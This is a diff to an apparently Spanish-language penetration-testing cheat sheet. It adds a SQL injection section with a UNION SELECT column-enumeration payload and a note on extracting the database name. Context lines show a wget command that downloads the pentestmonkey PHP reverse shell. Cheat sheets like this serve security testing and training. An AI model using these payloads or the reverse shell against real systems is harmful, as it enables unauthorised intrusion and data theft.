@@ -47,6 +47,13 @@ Shell PHP
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 ```
 
+## SQL Injection
+
+Columns enumeration (sustituir el numero correspondiente de la última columna por 'database()' para saber el nombre de la BBDD)
+```
+UNION SELECT 1,2,...
+```
+
 # Powershell
 
 Descargar binarios
